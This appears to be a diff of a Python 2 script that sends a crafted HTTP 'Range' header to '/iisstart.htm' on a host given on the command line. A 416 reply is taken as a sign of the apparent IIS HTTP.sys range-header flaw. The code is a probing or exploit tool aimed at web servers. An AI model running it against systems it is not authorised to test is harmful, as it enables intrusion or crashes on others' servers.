@@ -20,7 +20,7 @@ def main(argv):
     rhost = sys.argv[1]
 
     try:
-        r = requests.get("{}".format(rhost), headers={"Range": payload})
+        r = requests.get("{}/iisstart.htm".format(rhost), headers={"Range": payload})
         print "[+] Sending the payload: " + payload + " in Range header"
 
         if r.status_code == 416 and 'Requested Range Not Satisfiable' in r.reason:
